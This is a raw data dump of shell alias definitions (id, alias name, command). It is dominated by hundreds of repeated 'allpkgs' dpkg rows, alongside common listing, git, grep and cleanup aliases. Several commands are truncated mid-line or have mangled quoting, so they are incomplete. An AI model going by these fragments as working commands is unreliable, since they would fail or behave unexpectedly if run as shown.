3631059,583271,Il,| less"""
3630479,583245,rmsvn,find . -name .svn -print0 | xargs -0 rm -rf"""
3625767,582890,lsd,ls -l | grep '^d'"""
3621359,582317,lh,l | head"""
3618530,582226,gd,git diff | mate"""
3615235,582133,hgrep,history | grep"""
3600416,580075,gitlog,git log-all | less -R"""
3571460,575939,lg,ls | grep -i """
3502112,557499,adblh,adb logcat -b events -b main -b radio | highlight"""
3494211,555185,ll, /etc/bash.bashrc |xargs`"
3491183,554152,cwd,pwd | xsel -ib"""
3468325,548965,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3467073,548563,find,find . -type f | grep -E --color"""
3433990,540125,lsd,ls -lF ${colorflag} | grep """"^d"""""""
3421548,538634,gCl,git status | sed -n """"s/^.*both [a-z]*ed: *//p"""""""
3408540,536389,ram,echo 3 | sudo tee /proc/sys/vm/drop_caches ; tree && sync && echo 3 > /proc/sys/vm/drop_caches && tree"""
3406309,536170,lsd,ls -l | grep """"^d"""""""
3393103,534796,gda,git diff | atom -"""
3385116,533196,valgrind-unity,G_SLICE=always-malloc G_DEBUG=gc-friendly valgrind --tool=memcheck --num-callers=50 --leak-check=full --track-origins=yes --xml=yes --log-file=unity-valgrind.20120409T160245.xml compiz --replace 2>&1 | tee ~/unity-valgrind.20120409T160245.log"""
3376974,531422,lsd,ls -l | grep """"^d"""""""
3325934,528198,cpwd,pwd | xclip -sel c"""
3325293,528157,kubeflow,kubectl port-forward -n kubeflow service/ambassador 8080:80 | /usr/bin/sed -e """"1 i\\"
3325291,528157,sonarr,kubectl port-forward -n sonarr service/sonarr 8989 | /usr/bin/sed -e """"1 i\\"
3324192,528077,lsofip,lsof -i -P | grep"""
3322546,527994,psg,ps aux | grep"""
3321809,527969,gCl,git status | sed -n """"s/^.*both [a-z]*ed: *//p"""""""
3320465,527912,usage,du --summarize -k err.txt generated.file succ.txt | sort --numeric-sort"""
3315755,527679,rmsvn,find . -name .svn -print0 | xargs -0 rm -rf"""
3315633,527675,LS,ls -alF | command less -E"""
3314087,527451,h,history | grep"""
3313870,527371,ip,curl -s http://checkip.dyndns.com/ | sed 's/[^0-9\.]//g'"""
3290575,525669,gCl,git status | sed -n """"s/^.*both [a-z]*ed: *//p"""""""
3288036,525410,L,| less"""
3287788,525386,cmount,mount | column -t"""
3287682,525356,random_mac,sudo ifconfig eth0 ether `openssl rand -hex 6 | sed """"s/\(..\)/\1:/g; s/.$//""""`"""
3285581,525227,clcp,config log --stat -p | bat -l diff"""
3250953,521976,agsm,comm -23 <(apt-mark showmanual | sort -u) \"
3224194,516618,psg,ps aux | grep"""
3224104,516616,lsgi,lsmod | grep -i"""
3221985,516437,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221918,516433,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221843,516426,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221672,516422,dfc,dfc -fTw -c always | /usr/bin/grep -P """"^/"""""""
3221587,516420,lsd,ls -l ${colorflag} | grep """"^d"""""""
3221521,516418,gf,git ls-files | grep"""
3221408,516411,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221277,516406,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221211,516404,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221129,516386,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3221062,516383,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220996,516381,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220930,516379,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220864,516377,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220798,516375,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220732,516373,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220665,516370,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3220587,516365,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3184992,512901,gsh,git show --stat=200 | fp"""
3181912,512425,lsn,ls | nl"""
3177469,512004,allpkgs,dpkg --get-selections | grep -v deinstall"""
3162982,510853,lm,la | """"$PAGER"""""""
3151853,509318,lol, """"screenfetch | lolcat -F 0.2 -a -s 10""""0"""
3144596,508517,allpkgs,dpkg --get-selections | grep -v deinstall"""
3133081,507016,allpkgs,dpkg --get-selections | grep -v deinstall"""
3133021,507011,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132949,507006,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132925,507005,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132884,507003,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132858,507000,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132820,506996,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132752,506992,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132657,506990,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132633,506989,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132606,506987,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132582,506986,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132558,506985,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132514,506982,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132450,506978,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132426,506977,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132368,506975,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132329,506973,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132295,506971,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132271,506970,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132197,506965,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132173,506964,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132148,506962,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132124,506961,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132100,506960,allpkgs,dpkg --get-selections | grep -v deinstall"""
3132022,506955,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131998,506954,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131967,506951,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131943,506950,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131919,506949,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131891,506946,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131867,506945,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131828,506943,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131778,506940,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131754,506939,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131730,506938,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131634,506933,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131600,506931,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131576,506930,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131552,506929,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131528,506928,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131315,506905,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131291,506904,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131267,506903,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131226,506899,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131199,506896,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131175,506894,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131139,506892,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131115,506890,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131091,506888,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131046,506886,allpkgs,dpkg --get-selections | grep -v deinstall"""
3131022,506884,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130998,506883,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130974,506882,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130950,506881,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130903,506875,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130879,506874,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130855,506873,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130831,506871,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130782,506869,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130758,506868,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130724,506865,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130668,506863,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130644,506862,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130620,506861,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130596,506860,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130572,506859,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130548,506858,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130493,506855,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130469,506854,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130445,506853,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130421,506852,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130397,506849,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130354,506847,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130330,506846,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130306,506845,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130282,506843,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130258,506841,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130234,506840,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130210,506839,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130186,506837,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130162,506836,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130138,506835,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130114,506834,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130054,506829,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130030,506828,allpkgs,dpkg --get-selections | grep -v deinstall"""
3130006,506827,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129982,506826,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129900,506822,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129789,506819,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129765,506818,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129697,506815,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129673,506814,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129649,506813,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129625,506812,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129601,506811,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129577,506810,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129553,506809,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129529,506808,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129505,506807,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129481,506806,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129457,506805,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129433,506804,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129409,506803,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129385,506801,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129361,506800,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129337,506799,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129313,506798,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129289,506797,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129265,506796,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129241,506795,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129217,506794,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129193,506793,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129169,506792,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129145,506791,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129121,506790,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129097,506789,allpkgs,dpkg --get-selections | grep -v deinstall"""
3129073,506788,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128975,506785,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128951,506784,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128927,506783,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128903,506782,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128879,506781,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128855,506780,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128831,506779,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128807,506778,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128759,506775,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128735,506774,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128711,506773,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128687,506772,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128663,506771,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128639,506770,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128615,506769,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128591,506768,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128567,506767,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128543,506766,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128519,506765,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128495,506764,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128471,506763,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128447,506762,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128423,506761,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128399,506760,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128375,506759,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128351,506758,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128327,506757,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128301,506755,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128277,506754,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128253,506753,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128229,506752,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128205,506751,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128181,506750,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128157,506749,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128133,506748,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128109,506747,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128085,506746,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128061,506745,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128037,506744,allpkgs,dpkg --get-selections | grep -v deinstall"""
3128013,506743,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127989,506742,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127965,506741,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127941,506740,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127917,506739,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127893,506738,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127869,506737,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127845,506735,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127821,506734,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127797,506732,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127773,506731,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127749,506730,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127725,506729,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127701,506728,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127677,506727,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127653,506726,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127629,506725,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127605,506724,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127581,506723,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127557,506722,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127533,506721,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127509,506719,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127485,506718,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127461,506716,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127437,506715,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127413,506714,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127389,506713,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127365,506712,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127340,506710,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127316,506708,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127292,506706,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127268,506705,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127244,506704,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127220,506703,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127196,506702,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127172,506701,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127148,506700,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127091,506698,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127067,506697,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127043,506696,allpkgs,dpkg --get-selections | grep -v deinstall"""
3127015,506694,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126991,506693,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126967,506692,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126943,506691,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126919,506690,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126895,506689,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126871,506688,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126847,506687,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126823,506686,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126799,506685,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126775,506684,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126751,506683,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126727,506682,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126703,506681,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126679,506680,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126655,506679,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126631,506678,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126607,506677,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126583,506676,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126559,506675,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126534,506673,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126510,506672,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126486,506671,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126462,506670,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126438,506669,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126414,506668,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126390,506667,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126366,506666,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126342,506665,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126318,506664,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126294,506663,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126270,506662,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126244,506660,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126220,506659,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126196,506658,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126172,506657,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126148,506656,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126124,506655,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126100,506654,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126076,506653,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126052,506652,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126028,506651,allpkgs,dpkg --get-selections | grep -v deinstall"""
3126004,506650,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125980,506649,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125948,506647,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125924,506646,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125900,506645,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125876,506644,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125824,506642,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125800,506641,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125776,506640,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125752,506639,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125728,506638,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125704,506637,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125680,506636,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125650,506634,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125626,506633,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125602,506632,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125578,506631,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125554,506630,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125530,506629,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125506,506628,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125479,506626,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125455,506625,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125431,506624,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125400,506622,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125376,506621,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125352,506620,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125328,506619,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125304,506617,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125271,506615,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125247,506614,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125223,506613,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125199,506612,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125175,506611,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125151,506610,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125127,506609,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125103,506608,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125079,506607,allpkgs,dpkg --get-selections | grep -v deinstall"""
3125055,506606,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124974,506602,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124950,506601,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124926,506600,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124887,506597,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124863,506596,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124813,506590,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124789,506589,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124610,506563,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124375,506550,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124291,506538,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124232,506531,allpkgs,dpkg --get-selections | grep -v deinstall"""
3124208,506530,allpkgs,dpkg --get-selections | grep -v deinstall"""
3118424,505961,allpkgs,dpkg --get-selections | grep -v deinstall"""
3118251,505957,allpkgs,dpkg --get-selections | grep -v deinstall"""
3117561,505940,allpkgs,dpkg --get-selections | grep -v deinstall"""
3116903,505928,allpkgs,dpkg --get-selections | grep -v deinstall"""
3116738,505923,allpkgs,dpkg --get-selections | grep -v deinstall"""
3116106,505911,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115954,505901,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115928,505898,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115334,505891,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115146,505881,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115122,505880,allpkgs,dpkg --get-selections | grep -v deinstall"""
3115093,505875,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114787,505872,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114763,505871,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114739,505870,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114433,505867,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114409,505866,allpkgs,dpkg --get-selections | grep -v deinstall"""
3114232,505862,allpkgs,dpkg --get-selections | grep -v deinstall"""
3113785,505853,allpkgs,dpkg --get-selections | grep -v deinstall"""
3113197,505847,allpkgs,dpkg --get-selections | grep -v deinstall"""
3113173,505845,allpkgs,dpkg --get-selections | grep -v deinstall"""
3113125,505843,allpkgs,dpkg --get-selections | grep -v deinstall"""
3113101,505842,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112736,505836,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112420,505830,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112396,505829,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112225,505826,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112060,505824,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112036,505821,allpkgs,dpkg --get-selections | grep -v deinstall"""
3112012,505820,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111932,505818,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111908,505817,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111884,505816,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111860,505815,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111836,505814,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111812,505813,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111788,505812,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111764,505811,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111739,505809,allpkgs,dpkg --get-selections | grep -v deinstall"""
3111151,505804,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110986,505802,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110962,505801,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110938,505800,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110773,505798,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110749,505797,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110725,505796,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110701,505795,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110677,505793,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110653,505792,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110629,505791,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110605,505790,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110581,505789,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110557,505788,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110533,505787,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110509,505785,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110485,505783,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110461,505782,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110437,505781,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110413,505780,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110389,505779,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110365,505778,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110200,505776,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110035,505774,allpkgs,dpkg --get-selections | grep -v deinstall"""
3110011,505773,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109987,505772,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109940,505770,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109916,505767,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109610,505764,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109586,505763,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109562,505762,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109538,505761,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109514,505760,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109490,505759,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109466,505757,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109154,505753,allpkgs,dpkg --get-selections | grep -v deinstall"""
3109130,505752,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108965,505750,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108941,505749,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108917,505748,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108893,505745,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108869,505744,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108845,505743,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108808,505741,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108640,505737,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108603,505735,allpkgs,dpkg --get-selections | grep -v deinstall"""
